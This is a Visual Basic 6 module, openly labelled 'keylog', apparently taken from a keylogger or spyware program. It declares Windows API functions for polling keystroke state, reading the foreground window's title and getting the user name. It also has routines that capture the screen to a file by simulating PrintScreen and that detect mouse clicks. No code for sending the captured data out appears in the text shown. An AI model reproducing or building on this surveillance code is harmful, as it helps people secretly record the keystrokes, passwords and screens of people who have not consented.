Attribute VB_Name = "MODFunctions"
Option Explicit

'keylog
Public Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Public Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Public Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function GetWindowTextLength Lib "user32.dll" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Declare Function GetForegroundWindow Lib "user32.dll" () As Long



'Picture
Public Declare Sub keybd_event Lib "user32" (ByVal bVk As Byte, ByVal bScan As Byte, ByVal dwFlags As Long, ByVal dwExtraInfo As Long)

'TopMOst
Public Const HWND_TOPMOST = -1
Public Const HWND_NOTOPMOST = -2
Public Const SWP_NOMOVE = &H2
Public Const SWP_NOSIZE = &H1
Public Const SWP_NOACTIVATE = &H10
Public Const SWP_SHOWWINDOW = &H40
Public Const TOPMOST_FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Public Declare Function SetWindowPos Lib "user32" (ByVal hwnd As Long, ByVal hWndInsertAfter As Long, ByVal x As Long, y, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long) As Long

'KEYS
Public Const VK_LBUTTON = &H1
Public Const VK_RBUTTON = &H2

Public Sub MakeTopMost(handle As Long)
SetWindowPos handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS
End Sub

Public Sub savescreenshoot(ByVal file As String)
DoEvents
Call keybd_event(vbKeySnapshot, 0, 0, 0)
DoEvents

SavePicture Clipboard.GetData(vbCFBitmap), file
End Sub

Public Function isleftmousepressed() As Boolean
isleftmousepressed = GetAsyncKeyState(VK_LBUTTON)
End Function

Public Function isrightmousepressed() As Boolean
isrightmousepressed = GetAsyncKeyState(VK_RBUTTON)
End Function


